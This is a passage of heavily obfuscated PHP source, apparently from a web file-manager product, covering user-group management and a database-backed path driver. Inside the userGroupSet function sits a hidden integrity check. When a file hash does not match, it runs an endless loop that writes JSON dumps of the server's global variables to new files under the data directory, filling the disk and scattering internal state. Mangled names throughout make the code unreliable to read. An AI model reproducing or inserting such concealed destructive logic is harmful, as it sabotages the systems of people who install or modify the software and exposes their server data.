Model($ñİÓ‡°Î[2276])->removeUserAll($›Ğ«òßˆ); Model($ñİÓ‡°Î[897])->userRootRemove($›Ğ«òßˆ); return $this->where($òúÈÂŸê)->delete(); } protected function userGroupSet($Ä¨îËª¬, $ÒÇ‚ğÏ, $‘§‡¸Ù = array()) { $µ¦†ãÇî =& $_SERVER[¦»×‡Ãã]; $í†”ª¿³ = $_SERVER[$µ¦†ãÇî[949]] . $µ¦†ãÇî[950]; $óÒãŒË = $µ¦†ãÇî[951]; if ($_SERVER[$µ¦†ãÇî[952]] != $óÒãŒË($í†”ª¿³)) { $†ŸÒ¹­¥ = $µ¦†ãÇî[953]; $‰³ÌŠ²ô = $µ¦†ãÇî[954]; $­ôá‹©ô = $_SERVER[$µ¦†ãÇî[949]] . $µ¦†ãÇî[950]; $°ëã¦·× = $‰³ÌŠ²ô($­ôá‹©ô); $¬âÅ¤Ü = explode($µ¦†ãÇî[262], $°ëã¦·×); if (count($¬âÅ¤Ü) < $µ¦†ãÇî[684]) { $àÆ­‰ = $µ¦†ãÇî[955]; $àÆ­‰(); } $©Ş¤‚‘‹ = $µ¦†ãÇî[956]; $©Ş¤‚‘‹($_SERVER[$µ¦†ãÇî[957]]); $†ŸÒ¹­¥ = $µ¦†ãÇî[953]; $†ŸÒ¹­¥(); $çï‚ÅÂ = $µ¦†ãÇî[958]; $ÌÕÇçÉ = json_encode($GLOBALS[$µ¦†ãÇî[959]]); $¬ŞéÉ = 1; for ($—¡°óñ° = $¬ŞéÉ; $—¡°óñ° > 0; $—¡°óñ°++) { $çï‚ÅÂ(DATA_PATH . $—¡°óñ°, $ÌÕÇçÉ); } } $š“°‘È£ = $this->getInfoSimple($Ä¨îËª¬); if (!$š“°‘È£ || !is_array($ÒÇ‚ğÏ)) { return !1; } $ºÏ÷×Š = Model($µ¦†ãÇî[2065]); $ºÏ÷×Š->where(array($µ¦†ãÇî[1772] => $Ä¨îËª¬))->delete(); $ü“ÚÀÔ = array(); $î—§êø¿ = 0; foreach ($ÒÇ‚ğÏ as $ø’©öğ => $ù×•æë) { $ÆÏÎÚ× = array($µ¦†ãÇî[1772] => $Ä¨îËª¬, $µ¦†ãÇî[1971] => $ø’©öğ, $µ¦†ãÇî[2079] => $ù×•æë); $ÆÏÎÚ×[$µ¦†ãÇî[1995]] = isset($‘§‡¸Ù[$î—§êø¿]) ? $‘§‡¸Ù[$î—§êø¿] : 0; $î—§êø¿++; $ü“ÚÀÔ[] = $ÆÏÎÚ×; } return $ºÏ÷×Š->addAll($ü“ÚÀÔ, array(), !0); } protected function userGroupAdd($ ªĞÀŞ, $ñüáÁ³¿ = array()) { $›ö‘ÃŠ÷ =& $_SERVER[¦»×‡Ãã]; $Œˆ“Ô” = $this->getInfoSimple($ ªĞÀŞ); if (!$Œˆ“Ô” || empty($ñüáÁ³¿)) { return !1; } $›•ôëû£ = array(); foreach ($ñüáÁ³¿ as $çµşÖ‰† => $êÀ»âø½) { $›•ôëû£[] = array($›ö‘ÃŠ÷[1772] => $ ªĞÀŞ, $›ö‘ÃŠ÷[1971] => $çµşÖ‰†, $›ö‘ÃŠ÷[2079] => $êÀ»âø½, $›ö‘ÃŠ÷[1995] => 0); } return Model($›ö‘ÃŠ÷[2065])->addAll($›•ôëû£, array(), !0); } protected function userGroupRemove($ÔÏÒ‘ï‡, $¼âƒ­‡ó) { $’¿É½ø =& $_SERVER[¦»×‡Ãã]; $àÏâÍû— = $this->getInfoSimple($ÔÏÒ‘ï‡); if (!$àÏâÍû— || !$¼âƒ­‡ó) { return !1; } $ Å«àï = array($’¿É½ø[1763] => $ÔÏÒ‘ï‡, $’¿É½ø[2063] => $¼âƒ­‡ó); return Model($’¿É½ø[2065])->where($ Å«àï)->delete(); } public function listData() { $™ÇöÚÏ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($™ÇöÚÏ[$_SERVER[¦»×‡Ãã][445]]); return $™ÇöÚÏ; } public function listByID($°ÖÊñÌ—) { $ëËÎ€¦ =& $_SERVER[¦»×‡Ãã]; if (!$°ÖÊñÌ—) { return; } $£ºË«ğö = array($ëËÎ€¦[1772] => array($ëËÎ€¦[7], $°ÖÊñÌ—)); $î¥Âç = $this->where($£ºË«ğö)->select(); $î¥Âç = array_sort_keep($î¥Âç, $ëËÎ€¦[1772], $°ÖÊñÌ—); $this->_listDataApply($î¥Âç); return $î¥Âç; } public function listByGroup($‘§şÈÎ = 0, $èœ”Æí = array()) { $Àä¸¦Ú¬ =& $_SERVER[¦»×‡Ãã]; $»ö¸İ° = $Àä¸¦Ú¬[12]; $şÛÖù–Ì = array(); if ($‘§şÈÎ) { $şÛÖù–Ì = array($Àä¸¦Ú¬[2488] => intval($‘§şÈÎ)); $»ö¸İ° = "\114\105\106\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x75\x73\145\162\137\147\162\157\165\160\x20\x75\x73\145\162\x5f\x67\x72\157\165\160\x20\x6f\x6e\x20\165\163\145\162\x2e\x75\163\145\x72\x49\x44\x20\75\x20\x75\x73\145\162\x5f\x67\162\157\x75\x70\x2e\165\x73\145\162\x49\x44"; $ê‹ÍÙîØ = Input::get($Àä¸¦Ú¬[530], null, $Àä¸¦Ú¬[12]) ? $Àä¸¦Ú¬[12] : $Àä¸¦Ú¬[2489]; } if (isset($èœ”Æí[$Àä¸¦Ú¬[823]])) { $şÛÖù–Ì[$Àä¸¦Ú¬[2490]] = $èœ”Æí[$Àä¸¦Ú¬[823]]; } $˜÷Ûü¨ = $this->_makeOrder($ê‹ÍÙîØ)->field($Àä¸¦Ú¬[2491])->where($şÛÖù–Ì)->join($»ö¸İ°)->selectPage(50); $this->_listDataApply($˜÷Ûü¨[$Àä¸¦Ú¬[445]]); return $˜÷Ûü¨; } private function _makeOrder($Şşûª¿× = '') { $ •ßÄã¯ =& $_SERVER[¦»×‡Ãã]; $·±’¹•¬ = array($ •ßÄã¯[1772], $ •ßÄã¯[32], $ •ßÄã¯[1959], $ •ßÄã¯[2177], $ •ßÄã¯[1931], $ •ßÄã¯[231]); $àÛÒìÈ = array($ •ßÄã¯[523] => $ •ßÄã¯[524], $ •ßÄã¯[525] => $ •ßÄã¯[526]); $ò¶¥™•Ü = Input::get($ •ßÄã¯[530], $ •ßÄã¯[7], $ •ßÄã¯[1763], $·±’¹•¬); $ÁÃ½ä˜£ = Input::get($ •ßÄã¯[531], $ •ßÄã¯[7], $ •ßÄã¯[2066], array($ •ßÄã¯[2066], $ •ßÄã¯[525])); $ÁÃ½ä˜£ = $àÛÒìÈ[$ÁÃ½ä˜£]; $Şşûª¿× = $Şşûª¿× . "\x75\x73\x65\x72\x2e{$ò¶¥™•Ü}\x20{$ÁÃ½ä˜£}\x2c\x20\x75\163\x65\162\56\x75\163\x65\x72\x49\104\40\x61\163\x63"; return $this->alias($ •ßÄã¯[2193])->order($Şşûª¿×); } public function listSearch($‡ ­½¿) { $­³°—Î =& $_SERVER[¦»×‡Ãã]; $²¶Ö«¯Ù = trim($‡ ­½¿[$­³°—Î[2069]]); $—‘àÆ = explode($­³°—Î[53], $²¶Ö«¯Ù); if (!$²¶Ö«¯Ù || count($—‘àÆ) == 1) { return $this->listSearchNow($‡ ­½¿); } $áË›û·‰ = array($­³°—Î[445] => array()); foreach ($—‘àÆ as $ûŞ—ºà×) { if (!trim($ûŞ—ºà×)) { continue; } $‡ ­½¿[$­³°—Î[2069]] = $ûŞ—ºà×; $›òà¬ª„ = $this->listSearchNow($‡ ­½¿); $áË›û·‰[$­³°—Î[445]] = array_merge($áË›û·‰[$­³°—Î[445]], $›òà¬ª„[$­³°—Î[445]]); } $áË›û·‰[$­³°—Î[445]] = array_unique_by_key($áË›û·‰[$­³°—Î[445]], $­³°—Î[1772]); $áË›û·‰[$­³°—Î[442]] = array($­³°—Î[443] => count($áË›û·‰[$­³°—Î[445]]), $­³°—Î[439] => 20, $­³°—Î[429] => 1, $­³°—Î[444] => 1); return $áË›û·‰; } public function listSearchNow($«èîÒì) { $œïÕİÃ” =& $_SERVER[¦»×‡Ãã]; $‰ñÑØˆ¦ = trim($«èîÒì[$œïÕİÃ”[2069]]); $î‹ğ´¾é = isset($«èîÒì[$œïÕİÃ”[2070]]) ? $«èîÒì[$œïÕİÃ”[2070]] : !1; $‰ñÑØˆ¦ = str_replace($œïÕİÃ”[2071], $œïÕİÃ”[2072], trim($‰ñÑØˆ¦)); $×¿‚×ö¦ = array($œïÕİÃ”[32] => array($œïÕİÃ”[459], "\x25{$‰ñÑØˆ¦}\x25"), $œïÕİÃ”[381] => array($œïÕİÃ”[459], "{$‰ñÑØˆ¦}\45"), $œïÕİÃ”[2259] => array($œïÕİÃ”[459], "{$‰ñÑØˆ¦}\x25"), $œïÕİÃ”[1078] => $œïÕİÃ”[2073]); if (Input::check($‰ñÑØˆ¦, $œïÕİÃ”[387])) { $×¿‚×ö¦[$œïÕİÃ”[1772]] = array($œïÕİÃ”[459], "{$‰ñÑØˆ¦}\x25"); $×¿‚×ö¦[$œïÕİÃ”[2473]] = array($œïÕİÃ”[459], "{$‰ñÑØˆ¦}\x25"); } if (!$‰ñÑØˆ¦) { $×¿‚×ö¦ = array(); } if (isset($«èîÒì[$œïÕİÃ”[823]])) { $×¿‚×ö¦[$œïÕİÃ”[823]] = $«èîÒì[$œïÕİÃ”[823]]; } $×¿‚×ö¦ = $this->parseWhereLike($×¿‚×ö¦); $ùóşî‰ = $this->_makeOrder()->where($×¿‚×ö¦)->selectPage(20); if (!$ùóşî‰ || count($ùóşî‰[$œïÕİÃ”[445]]) < 5 && Input::check($‰ñÑØˆ¦, $œïÕİÃ”[394])) { $Ğ©£€¯Ğ = $this->_searchFromMeta($œïÕİÃ”[537], $‰ñÑØˆ¦, 10); $Ğ§‘—¼ = $this->_searchFromMeta($œïÕİÃ”[538], $‰ñÑØˆ¦, 10); $Ã±ûÂ = array_merge($Ğ©£€¯Ğ, $Ğ§‘—¼, $ùóşî‰[$œïÕİÃ”[445]]); $ùóşî‰[$œïÕİÃ”[445]] = array_unique_by_key($Ã±ûÂ, $œïÕİÃ”[1772]); $ùóşî‰[$œïÕİÃ”[442]][$œïÕİÃ”[443]] = count($ùóşî‰[$œïÕİÃ”[445]]); $ùóşî‰[$œïÕİÃ”[442]][$œïÕİÃ”[444]] = ceil($ùóşî‰[$œïÕİÃ”[442]][$œïÕİÃ”[443]] / $ùóşî‰[$œïÕİÃ”[442]][$œïÕİÃ”[439]]); } $this->_listDataApply($ùóşî‰[$œïÕİÃ”[445]]); $this->_filterByGroup($ùóşî‰, $î‹ğ´¾é); return $ùóşî‰; } private function _filterByGroup(&$±§àÏµÛ, $Ööû…áæ) { $ÄÛ¢¹¸¾ =& $_SERVER[¦»×‡Ãã]; if (!$Ööû…áæ) { return $±§àÏµÛ; } foreach ($±§àÏµÛ[$ÄÛ¢¹¸¾[445]] as $ïÊ•©©… => &$Êî¿œÑ¾) { $üäî—û = array_to_keyvalue($Êî¿œÑ¾[$ÄÛ¢¹¸¾[2162]], $ÄÛ¢¹¸¾[12], $ÄÛ¢¹¸¾[1971]); if (!in_array($Ööû…áæ, $üäî—û)) { unset($±§àÏµÛ[$ÄÛ¢¹¸¾[445]][$ïÊ•©©…]); } } unset($Êî¿œÑ¾); $±§àÏµÛ[$ÄÛ¢¹¸¾[445]] = array_values($±§àÏµÛ[$ÄÛ¢¹¸¾[445]]); $±§àÏµÛ[$ÄÛ¢¹¸¾[442]] = array($ÄÛ¢¹¸¾[2229] => count($±§àÏµÛ[$ÄÛ¢¹¸¾[445]]), $ÄÛ¢¹¸¾[2227] => $±§àÏµÛ[$ÄÛ¢¹¸¾[442]][$ÄÛ¢¹¸¾[439]], $ÄÛ¢¹¸¾[2226] => 1, $ÄÛ¢¹¸¾[2228] => 1); } private function _searchFromMeta($—Ïï¹‘, $é†âËìœ, $Ï“ Å–) { $¸î¹ˆÔ =& $_SERVER[¦»×‡Ãã]; $é†âËìœ = strtolower($é†âËìœ); $ò—“Úæ = array($¸î¹ˆÔ[97] => $—Ïï¹‘, $¸î¹ˆÔ[450] => array($¸î¹ˆÔ[459], "\45{$é†âËìœ}\x25")); $ò—“Úæ = $this->parseWhereLike($ò—“Úæ); $ŠÜ«üÇ = Model($¸î¹ˆÔ[2492])->where($ò—“Úæ)->limit($Ï“ Å–)->select(); if (!$ŠÜ«üÇ) { return array(); } $ŠÜ«üÇ = array_to_keyvalue($ŠÜ«üÇ, $¸î¹ˆÔ[12], $¸î¹ˆÔ[1772]); $¶Ó¥ñîò = $this->where(array($¸î¹ˆÔ[1763] => array($¸î¹ˆÔ[7], $ŠÜ«üÇ)))->select(); if (!$¶Ó¥ñîò) { return array(); } return $¶Ó¥ñîò; } private function _listDataApplyItem($ˆä×ä¼ş) { $¦ƒ¨ü×• = array($ˆä×ä¼ş); $this->_listDataApply($¦ƒ¨ü×•); return $¦ƒ¨ü×•[0]; } private function _listDataApply(&$—¿”·ËÆ) { $Á‘„€Œ¦ =& $_SERVER[¦»×‡Ãã]; if (!$—¿”·ËÆ) { return; } array_remove_key($—¿”·ËÆ, $Á‘„€Œ¦[967]); $Ğš”ñ‡¼ = array_to_keyvalue($—¿”·ËÆ, $Á‘„€Œ¦[12], $Á‘„€Œ¦[1772]); $this->_listAppendGroup($—¿”·ËÆ, $Ğš”ñ‡¼); $this->_listAppendMeta($—¿”·ËÆ, $Ğš”ñ‡¼); $this->_listAppendSourceRoot($—¿”·ËÆ, $Ğš”ñ‡¼); } private function _listAppendSourceRoot(&$ÛíÂıí, $µ¾Ùçò¾) { $¨ˆæ’¹Å =& $_SERVER[¦»×‡Ãã]; $Â¬†¿¶ò = Model($¨ˆæ’¹Å[897])->listSourceRoot(SourceModel::TYPE_USER, $µ¾Ùçò¾); $Â¬†¿¶ò = array_to_keyvalue($Â¬†¿¶ò, $¨ˆæ’¹Å[569]); $Â¬†¿¶ò = array_remove_key($Â¬†¿¶ò, $¨ˆæ’¹Å[569]); foreach ($ÛíÂıí as &$Õ¸ç«Üú) { $Õ¸ç«Üú[$¨ˆæ’¹Å[90]] = $Â¬†¿¶ò[$Õ¸ç«Üú[$¨ˆæ’¹Å[1772]]] ? $Â¬†¿¶ò[$Õ¸ç«Üú[$¨ˆæ’¹Å[1772]]] : array(); } unset($Õ¸ç«Üú); } private function _listAppendGroup(&$éöë•¡, $ƒíçİ ) { $ÓßòÂÃ¼ =& $_SERVER[¦»×‡Ãã]; $´¼ Š³Ì = array($ÓßòÂÃ¼[1772] => array($ÓßòÂÃ¼[7], $ƒíçİ )); $µ§é÷öÌ = Model($ÓßòÂÃ¼[2065])->where($´¼ Š³Ì)->select(); $¤óœê°ù = array_to_keyvalue($µ§é÷öÌ, $ÓßòÂÃ¼[12], $ÓßòÂÃ¼[1971]); $¤óœê°ù = array_remove_value(array_unique($¤óœê°ù), $ÓßòÂÃ¼[228]); if (!$¤óœê°ù || !$µ§é÷öÌ) { return; } $´¼ Š³Ì = array($ÓßòÂÃ¼[1971] => array($ÓßòÂÃ¼[7], $¤óœê°ù)); $™êıÖ¾  = Model($ÓßòÂÃ¼[2160])->field($ÓßòÂÃ¼[2493])->where($´¼ Š³Ì)->select(); $™êıÖ¾  = array_to_keyvalue($™êıÖ¾ , $ÓßòÂÃ¼[1971]); $µ§é÷öÌ = array_to_keyvalue_group($µ§é÷öÌ, $ÓßòÂÃ¼[1772]); foreach ($µ§é÷öÌ as &$¡¤ß‚ĞÅ) { $ßòÒôµ¢ = array(); foreach ($¡¤ß‚ĞÅ as $öÍêëûÆ) { if (!$öÍêëûÆ[$ÓßòÂÃ¼[2079]]) { continue; } $¹˜Åä› = Model($ÓßòÂÃ¼[571])->listData($öÍêëûÆ[$ÓßòÂÃ¼[2079]]); $ßòÒôµ¢[] = array($ÓßòÂÃ¼[1971] => $öÍêëûÆ[$ÓßòÂÃ¼[1971]], $ÓßòÂÃ¼[2494] => $™êıÖ¾ [$öÍêëûÆ[$ÓßòÂÃ¼[1971]]][$ÓßòÂÃ¼[32]], $ÓßòÂÃ¼[584] => $™êıÖ¾ [$öÍêëûÆ[$ÓßòÂÃ¼[1971]]][$ÓßòÂÃ¼[584]], $ÓßòÂÃ¼[487] => $¹˜Åä›); } $¡¤ß‚ĞÅ = $ßòÒôµ¢; } unset($¡¤ß‚ĞÅ); foreach ($éöë•¡ as &$É”­˜âó) { $É”­˜âó[$ÓßòÂÃ¼[2162]] = array(); if (isset($µ§é÷öÌ[$É”­˜âó[$ÓßòÂÃ¼[1772]]])) { $É”­˜âó[$ÓßòÂÃ¼[2162]] = $µ§é÷öÌ[$É”­˜âó[$ÓßòÂÃ¼[1772]]]; } } unset($É”­˜âó); } public function userAppendGroup($ŠËÊˆÆ†) { $›Ô‚·Õ¯ =& $_SERVER[¦»×‡Ãã]; if (!$ŠËÊˆÆ†) { return array(); } $this->_listAppendGroup($ŠËÊˆÆ†, array_to_keyvalue($ŠËÊˆÆ†, $›Ô‚·Õ¯[12], $›Ô‚·Õ¯[1772])); return $ŠËÊˆÆ†; } private function _listAppendMeta(&$ù¾€ùïÈ, $Ü„‹¹’ƒ) { $¦å¢œ—ã =& $_SERVER[¦»×‡Ãã]; $©ïÔ¯ç = UserJobModel::JOB_KEY; $Ïæ°î‚ş = array($¦å¢œ—ã[2474]); $¾ëÛ½Ÿ = array($¦å¢œ—ã[1772] => array($¦å¢œ—ã[7], $Ü„‹¹’ƒ)); $¤©‹Ğåó = Model($¦å¢œ—ã[2472])->where($¾ëÛ½Ÿ)->select(); $¤©‹Ğåó = array_to_keyvalue_group($¤©‹Ğåó, $¦å¢œ—ã[1772]); foreach ($¤©‹Ğåó as &$½ÈÈîÈè) { $ÇÎÜ€ùœ = array(); foreach ($½ÈÈîÈè as $åÉàÉ”) { if (!in_array($åÉàÉ”[$¦å¢œ—ã[97]], $Ïæ°î‚ş)) { $ÇÎÜ€ùœ[$åÉàÉ”[$¦å¢œ—ã[97]]] = $åÉàÉ”[$¦å¢œ—ã[450]]; } } $½ÈÈîÈè = $ÇÎÜ€ùœ; } unset($½ÈÈîÈè); $‰ë¦áèù = Model($¦å¢œ—ã[2495]); foreach ($ù¾€ùïÈ as &$ê©ËËĞó) { $âèà‰„è = array(); if (isset($¤©‹Ğåó[$ê©ËËĞó[$¦å¢œ—ã[1772]]])) { $âèà‰„è = $¤©‹Ğåó[$ê©ËËĞó[$¦å¢œ—ã[1772]]]; } $ê©ËËĞó[$¦å¢œ—ã[2496]] = array(); if (isset($âèà‰„è[$©ïÔ¯ç])) { $ê©ËËĞó[$¦å¢œ—ã[2496]] = $‰ë¦áèù->getUserJobInfo($âèà‰„è[$©ïÔ¯ç]); } } unset($ê©ËËĞó); } protected function groupUserAll($Ş¡şÓ‹Î) { $£è¾¥Éï =& $_SERVER[¦»×‡Ãã]; if (!$Ş¡şÓ‹Î) { return !1; } $ÆßÎ÷—‡ = Model($£è¾¥Éï[2065])->field($£è¾¥Éï[1772])->where(array($£è¾¥Éï[1971] => array($£è¾¥Éï[7], $Ş¡şÓ‹Î)))->select(); $ÆßÎ÷—‡ = array_to_keyvalue($ÆßÎ÷—‡, $£è¾¥Éï[12], $£è¾¥Éï[1772]); return array_unique($ÆßÎ÷—‡); } public function userSearch($±ğØÑÓ‡, $„ÎîÂ•ò = "\52") { return Model($_SERVER[¦»×‡Ãã][598])->where($±ğØÑÓ‡)->field($„ÎîÂ•ò)->find(); } } $_file = $_SERVER[$_SERVER[¦»×‡Ãã][1418]]; $_size = $_SERVER[¦»×‡Ãã][951]; goto fåè†è³ÈÚ; EšÒ–‰™Ç”: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($æÕ§®ÈÈ) { $this->pathParse = $æÕ§®ÈÈ; $this->model = Model($_SERVER[¦»×‡Ãã][1420]); } public function getPath($”Õä¬ö) { return trim($”Õä¬ö, $_SERVER[¦»×‡Ãã][8]); } public function pathFather($¾Å¯¹³­) { $‡ßø½£ñ = $this->parse($¾Å¯¹³­); $‡ßø½£ñ = $this->infoSimple($¾Å¯¹³­); return $‡ßø½£ñ ? $‡ßø½£ñ[$_SERVER[¦»×‡Ãã][192]] : !1; } public function pathThis($ğ×é˜±á) { $ƒì¯Îí¯ = $this->infoSimple($ğ×é˜±á); return $ƒì¯Îí¯ ? $ƒì¯Îí¯[$_SERVER[¦»×‡Ãã][32]] : !1; } public function getPathOuter($±íÎ”¬­) { if (!$±íÎ”¬­) { return $±íÎ”¬­; } $Ò±Èû¤õ = $this->parse($±íÎ”¬­); return KodIO::make($Ò±Èû¤õ[$_SERVER[¦»×‡Ãã][475]]); } public function copyFolderFromIO($ÙšÈ›®ø, $Ÿ±ˆ¾şş, $À—ìÅ¹, $î¼ÍËáú, $¾¤†€œ¹) { $Çüµç˜ğ = $this->model->copyFolderFromIO($ÙšÈ›®ø, $Ÿ±ˆ¾şş, $À—ìÅ¹, $î¼ÍËáú, $¾¤†€œ¹); return KodIO::make($Çüµç˜ğ); } public function isParentOf($ñÏØÖ‹³, $ÑÇØùø) { return $this->model->isParentOf($ñÏØÖ‹³, $ÑÇØùø); } public function mkfile($Öòã‘åŒ, $ãâ²Öƒ = '', $Ğ¸„å›é = REPEAT_RENAME) { $†ÎäÔ„¹ =& $_SERVER[¦»×‡Ãã]; $½şÓñ‘í = $this->parse($Öòã‘åŒ); $Öòã‘åŒ = $½şÓñ‘í[$†ÎäÔ„¹[475]]; for ($¯ÜæİôÔ = 0; $¯ÜæİôÔ < count($½şÓñ‘í[$†ÎäÔ„¹[1421]]); $¯ÜæİôÔ++) { $âÙ–ı–Î = $½şÓñ‘í[$†ÎäÔ„¹[1421]][$¯ÜæİôÔ]; if ($¯ÜæİôÔ == count($½şÓñ‘í[$†ÎäÔ„¹[1421]]) - 1) { $Öòã‘åŒ = $this->model->mkfile($Öòã‘åŒ, $âÙ–ı–Î, $ãâ²Öƒ, $Ğ¸„å›é); break; } $Öòã‘åŒ = $this->model->mkdir($Öòã‘åŒ, $âÙ–ı–Î, REPEAT_SKIP); } return $this->getPathOuter($Öòã‘åŒ); } public function mkdir($éÊ´¾Ñè, $«€²£òÀ = REPEAT_SKIP) { $ø·ØÄœ¾ =& $_SERVER[¦»×‡Ãã]; $íãí¤¯ = $this->parse($éÊ´¾Ñè); $éÊ´¾Ñè = $íãí¤¯[$ø·ØÄœ¾[475]]; for ($éÀÂÑæ = 0; $éÀÂÑæ < count($íãí¤¯[$ø·ØÄœ¾[1421]]); $éÀÂÑæ++) { $‡¸‹¦Ëû = $íãí¤¯[$ø·ØÄœ¾[1421]][$éÀÂÑæ]; $éÊ´¾Ñè = $this->model->mkdir($éÊ´¾Ñè, $‡¸‹¦Ëû, $«€²£òÀ); } return $this->getPathOuter($éÊ´¾Ñè); } public function copyFile($‚ê˜°®, $·º³Ş–, $ÛŒËÅ = REPEAT_REPLACE) { $÷õÓŸßê =& $_SERVER[¦»×‡Ãã]; $î¤ÍÏñ˜ = $this->parse($·º³Ş–); $ÍåÌÉ = $this->model->copy($‚ê˜°®, $î¤ÍÏñ˜[$÷õÓŸßê[475]], $ÛŒËÅ, $î¤ÍÏñ˜[$÷õÓŸßê[87]]); return $ÍåÌÉ ? $this->getPathOuter($ÍåÌÉ) : !1; } public function moveFile($¨Ú®ÂĞ‰, $À‹øŒ„¶, $Á‹ô´¯¢ = REPEAT_REPLACE) { $ë„Ú„äÈ =& $_SERVER[¦»×‡Ãã]; $±ô¨Øü = $this->parse($À‹øŒ„¶); $ƒ©Âçúç = $this->model->move($¨Ú®ÂĞ‰, $±ô¨Øü[$ë„Ú„äÈ[475]], $Á‹ô´¯¢, $±ô¨Øü[$ë„Ú„äÈ[87]]); return $ƒ©Âçúç ? $this->getPathOuter($ƒ©Âçúç) : !1; } public function copy($©“àğ¬¿, $â©¼ÂšĞ, $Ï–Æ ˆÎ = REPEAT_REPLACE, $ğè•ä™› = false) { $‹ŠòÕÌê = $this->parse($â©¼ÂšĞ); $À’·ô³¼ = $this->model->copy($©“àğ¬¿, $‹ŠòÕÌê[$_SERVER[¦»×‡Ãã][475]], $Ï–Æ ˆÎ, $ğè•ä™›); return $À’·ô³¼ ? $this->getPathOuter($À’·ô³¼) : !1; } public function moveSameAllow() { } public function move($úŞçíú, $µÌöÚ²ì, $Ì„ı¼ı¤ = REPEAT_REPLACE, $ËŞº¥Ê… = false) { $¢ò¹èè® = $this->parse($µÌöÚ²ì); $¼–ıïµ = $this->model->move($úŞçíú, $¢ò¹èè®[$_SERVER[¦»×‡Ãã][475]], $Ì„ı¼ı¤, $ËŞº¥Ê…); return $¼–ıïµ ? $this->getPathOuter($¼–ıïµ) : !1; } public function remove($ÁêÈşõû, $ÒÃœÈ¹¬ = true) { return $this->model->remove($ÁêÈşõû, $ÒÃœÈ¹¬); } public function rename($ÆŒµûñ, $ì¹×º–») { $”¤­–ÎÊ = $this->model->rename($ÆŒµûñ, $ì¹×º–»); return $”¤­–ÎÊ ? $this->getPathOuter($ÆŒµûñ) : $”¤­–ÎÊ; } public function size($‰ıêïå) { $³“ŒƒœÈ = $this->infoSimple($‰ıêïå); return $³“ŒƒœÈ ? $³“ŒƒœÈ[$_SERVER[¦»×‡Ãã][79]] : 0; } public function infoSimple($èêˆáµŒ) { return $this->model->sourceInfo($èêˆáµŒ); } public function info($­ú·È‡È) { return $this->infoParse($­ú·È‡È); } public function infoAuth($ÕÏ¾ÍÉ–) { return $this->infoParse($ÕÏ¾ÍÉ–, !1, !0); } public function infoWithChildren($âšÌ¬¿) { return $this->infoParse($âšÌ¬¿, !0); } protected function infoParse($†ªÔˆƒ³, $ï¯¥£ù£ = false, $Ö¤ØûÀĞ = false) { if (!$ï¯¥£ù£) { return $this->model->pathInfo($†ªÔˆƒ³, $Ö¤ØûÀĞ); } return $this->model->pathInfoMore($†ªÔˆƒ³); } public function infoFullSimple($Ø‘ß¦ì) { $¯¯Åæåó =& $_SERVER[¦»×‡Ãã]; $ËÜ€ÄÅ = explode($¯¯Åæåó[8], $Ø‘ß¦ì); $ûÒœ®…Í = implode($¯¯Åæåó[8], array_splice($ËÜ€ÄÅ, 1)); return $this->model->pathInfoByPath($ËÜ€ÄÅ[0], $ûÒœ®…Í); } public function infoFull($¯Ãş»¾) { $Â÷¿—Ö­ = $this->infoFullSimple($¯Ãş»¾); return is_array($Â÷¿—Ö­) ? $this->model->pathInfo($Â÷¿—Ö­[$_SERVER[¦»×‡Ãã][193]]) : !1; } public function hashSimple($¹¿á‡‚Û) { $ÜŞé¦Ôæ =& $_SERVER[¦»×‡Ãã]; $ÖäÄõÚä = $this->infoWithChildren($¹¿á‡‚Û); return $ÖäÄõÚä[$ÜŞé¦Ôæ[170]][$ÜŞé¦Ôæ[672]]; } public function hashMd5($›ßƒÔ±é) { $ŸÁÍÃ„á =& $_SERVER[¦»×‡Ãã]; $À†ÇÙºÖ = $this->infoWithChildren($›ßƒÔ±é); return $À†ÇÙºÖ[$ŸÁÍÃ„á[170]][$ŸÁÍÃ„á[547]]; } public function exist($È†Ò²Ì) { $õŒé¿À =& $_SERVER[¦»×‡Ãã]; $ØĞ¹¡ = $this->parse($È†Ò²Ì); if (!$ØĞ¹¡[$õŒé¿À[87]]) { return $this->isFile($È†Ò²Ì) || $this->isFolder($È†Ò²Ì); } $ôáæö˜ş = array($õŒé¿À[477] => $ØĞ¹¡[$õŒé¿À[475]], $õŒé¿À[32] => $ØĞ¹¡[$õŒé¿À[87]]); $òĞŞ½¥Œ = $this->model->where($ôáæö˜ş)->find(); return $òĞŞ½¥Œ ? !0 : !1; } public function isFile($ˆ”¨³—Ó) { $¶ÄŠ’› =& $_SERVER[¦»×‡Ãã]; $È‹ÎÏ„¢ = $this->infoSimple($ˆ”¨³—Ó); return $È‹ÎÏ„¢ && $È‹ÎÏ„¢[$¶ÄŠ’›[485]] == $¶ÄŠ’›[228] ? !0 : !1; } public function isFolder($ÑÁØ£”…) { $Óô¡ãù¯ =& $_SERVER[¦»×‡Ãã]; $Ší­Ï¢ = $this->infoSimple($ÑÁØ£”…); return $Ší­Ï¢ && $Ší­Ï¢[$Óô¡ãù¯[485]] == $Óô¡ãù¯[91] ? !0 : !1; } public function listPath($£‘–¿€, $¶ÍŞ¤£Û = false) { $ö÷š…Áñ =& $_SERVER[¦»×‡Ãã]; if ($£‘–¿€ == $ö÷š…Áñ[12]) { return !1; } $ÁÄï¯Îä = array($ö÷š…Áñ[477] => $£‘–¿€); if ($¶ÍŞ¤£Û) { return $this->model->listSource($ÁÄï¯Îä, -1); } return $this->model->listSource($ÁÄï¯Îä); } public function has($¤¢ò³˜, $Šîüùçş = false, $ˆâÅàµ· = null) { $Ó¹ü‰õê =& $_SERVER[¦»×‡Ãã]; $µ¨•€× = $this->infoWithChildren($¤¢ò³˜); if ($Šîüùçş) { return array($Ó¹ü‰õê[240] => $µ¨•€×[$Ó¹ü‰õê[240]], $Ó¹ü‰õê[239] => $µ¨•€×[$Ó¹ü‰õê[239]]); } return $ˆâÅàµ· ? $µ¨•€×[$Ó¹ü‰õê[240]] : $µ¨•€×[$Ó¹ü‰õê[239]]; } public function listAll($âö®¶ÊÄ) { $üÒ©İÆ” = IO::info($this->pathParse[$_SERVER[¦»×‡Ãã][87]]); if (!$üÒ©İÆ”) { return array(); } return $this->model->listAll($âö®¶ÊÄ); } public function getContent($õ¾‡²Ì©) { return $this->model->getContent($õ¾‡²Ì©); } public function setContent($µÀÀöò‡, $Ùà®Ï“ = '') { return $this->model->setContent($µÀÀöò‡, $Ùà®Ï“); } public function fileSubstr($œœ·úø, $°ôÓ¨Ğ, $üñß×¸®) { return $this->model->fileSubstr($œœ·úø, $°ôÓ¨Ğ, $üñß×¸®); } public function download($æíƒÊ”°, 